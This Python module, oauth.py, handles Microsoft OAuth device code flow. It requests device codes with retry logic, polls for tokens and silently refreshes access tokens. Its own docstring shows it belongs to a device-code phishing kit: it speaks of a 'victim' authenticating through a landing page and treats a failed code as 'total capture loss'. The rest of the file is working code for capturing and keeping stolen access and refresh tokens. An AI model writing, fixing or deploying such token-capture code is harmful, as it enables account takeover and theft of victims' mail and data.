# ── oauth.py ─────────────────────────────────────────────
import requests
import logging
import time
from config import Config

logger = logging.getLogger(__name__)

def request_device_code(attempts=3, client_id=None):
    """Request a device code, retrying transient failures.

    Microsoft rate-limits /devicecode per client_id+IP. Under a traffic burst the
    first failures used to return None, and the caller then rendered a landing page
    with the dead placeholder code 'ABCD-1234' — the victim authenticated against a
    code that had no session behind it and was never polled. That is a silent total
    capture loss, so retry with backoff before giving up.
    """
    payload = {'client_id': client_id or Config.CLIENT_ID, 'scope': Config.SCOPE}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    last_err = None
    for attempt in range(1, attempts + 1):
        try:
            response = requests.post(Config.DEVICE_CODE_URL, data=payload, headers=headers, timeout=10)
            if response.status_code == 429:
                retry_after = response.headers.get('Retry-After')
                delay = float(retry_after) if retry_after else 1.5 * attempt
                logger.warning(f"[OAUTH] devicecode rate-limited (429), retrying in {delay:.1f}s "
                               f"(attempt {attempt}/{attempts})")
                time.sleep(delay)
                continue
            response.raise_for_status()
            data = response.json()
            uc = data.get('user_code')
            dc = data.get('device_code')
            if uc and dc:
                return uc, dc, data.get('verification_uri') or data.get('verification_url'), data.get('expires_in')
            last_err = f"incomplete response: {data}"
        except Exception as e:
            last_err = str(e)
            logger.warning(f"[OAUTH] devicecode attempt {attempt}/{attempts} failed: {e}")
            if attempt < attempts:
                time.sleep(1.0 * attempt)
    logger.error(f"Failed to request device code after {attempts} attempts: {last_err}")
    return None, None, None, None

def poll_token(device_code, client_id=None):
    payload = {'client_id': client_id or Config.CLIENT_ID, 'grant_type': 'urn:ietf:params:oauth:grant-type:device_code', 'device_code': device_code}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        response = requests.post(Config.TOKEN_URL, data=payload, headers=headers, timeout=10)
        data = response.json()
        
        if response.status_code == 200 and 'access_token' in data:
            return 'SUCCESS', data.get('access_token'), data.get('refresh_token'), data
        elif data.get('error') == 'authorization_pending':
            return 'PENDING', None, None, data
        elif data.get('error') == 'slow_down':
            return 'SLOW_DOWN', None, None, data
        elif data.get('error') == 'expired_token':
            return 'EXPIRED', None, None, data
        else:
            return 'ERROR', None, None, data
    except Exception as e:
        logger.error(f"Failed to poll token: {e}")
        return 'ERROR', None, None, {}

def refresh_access_token(refresh_token):
    """
    Refresh an OAuth 2.0 access token silently via Microsoft's token endpoint.
    Returns (success, new_access_token, new_refresh_token, expires_in, raw_data).
    """
    payload = {
        'client_id': Config.CLIENT_ID,
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token,
        'scope': Config.SCOPE
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        response = requests.post(Config.TOKEN_URL, data=payload, headers=headers, timeout=10)
        data = response.json()
        if response.status_code == 200 and 'access_token' in data:
            new_at = data.get('access_token')
            new_rt = data.get('refresh_token', refresh_token)
            expires_in = data.get('expires_in', 3600)
            return True, new_at, new_rt, expires_in, data
        else:
            return False, None, None, None, data
    except Exception as e:
        logger.error(f"Failed to refresh token: {e}")
        return False, None, None, None, {'error': str(e)}
